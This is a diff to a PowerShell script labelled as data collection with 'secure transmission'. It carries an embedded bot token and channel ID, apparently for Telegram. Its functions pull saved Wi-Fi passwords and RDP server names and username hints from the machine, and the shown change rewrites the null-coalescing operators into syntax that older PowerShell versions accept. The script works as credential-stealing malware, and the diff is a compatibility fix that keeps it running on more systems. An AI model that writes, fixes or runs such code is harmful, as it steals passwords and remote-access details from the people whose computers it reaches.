@@ -2,7 +2,7 @@
 # Comprehensive data collection with secure transmission
 
 param(
-    [string]$CommToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
+    [string]$CommToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFFJ2ZbhtJs",
     [string]$CommChannel = "2047893044"
 )
 
@@ -145,15 +145,24 @@ function Get-WirelessNetworkData {
                     }
                 }
                 
+                # Replace null coalescing operator with compatible syntax
+                $keyContent = if ($profileDetails["Key Content"]) { $profileDetails["Key Content"] } else { "No security key" }
+                $authentication = if ($profileDetails["Authentication"]) { $profileDetails["Authentication"] } else { "Unknown" }
+                $encryption = if ($profileDetails["Cipher"]) { $profileDetails["Cipher"] } else { "Unknown" }
+                $connectionMode = if ($profileDetails["Connection mode"]) { $profileDetails["Connection mode"] } else { "Unknown" }
+                $networkType = if ($profileDetails["Network type"]) { $profileDetails["Network type"] } else { "Unknown" }
+                $radioType = if ($profileDetails["Radio type"]) { $profileDetails["Radio type"] } else { "Unknown" }
+                $ssidName = if ($profileDetails["SSID name"]) { $profileDetails["SSID name"] } else { $profile }
+                
                 $wifiProfiles += @{
                     SSID = $profile
-                    Password = $profileDetails["Key Content"] ?? "No security key"
-                    Authentication = $profileDetails["Authentication"] ?? "Unknown"
-                    Encryption = $profileDetails["Cipher"] ?? "Unknown"
-                    ConnectionMode = $profileDetails["Connection mode"] ?? "Unknown"
-                    NetworkType = $profileDetails["Network type"] ?? "Unknown"
-                    RadioType = $profileDetails["Radio type"] ?? "Unknown"
-                    SSIDName = $profileDetails["SSID name"] ?? $profile
+                    Password = $keyContent
+                    Authentication = $authentication
+                    Encryption = $encryption
+                    ConnectionMode = $connectionMode
+                    NetworkType = $networkType
+                    RadioType = $radioType
+                    SSIDName = $ssidName
                     ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                 }
             } catch {
@@ -197,9 +206,11 @@ function Get-RemoteConnectionData {
                 foreach ($server in $rdpServers) {
                     $serverName = $server.PSChildName
                     $username = Get-ItemProperty -Path $server.PSPath -Name "UsernameHint" -ErrorAction SilentlyContinue
+                    $usernameHint = if ($username.UsernameHint) { $username.UsernameHint } else { "Not stored" }
+                    
                     $remoteData.RDPConnections += @{
                         Server = $serverName
-                        UsernameHint = $username.UsernameHint ?? "Not stored"
+                        UsernameHint = $usernameHint
                     }
                 }
             }
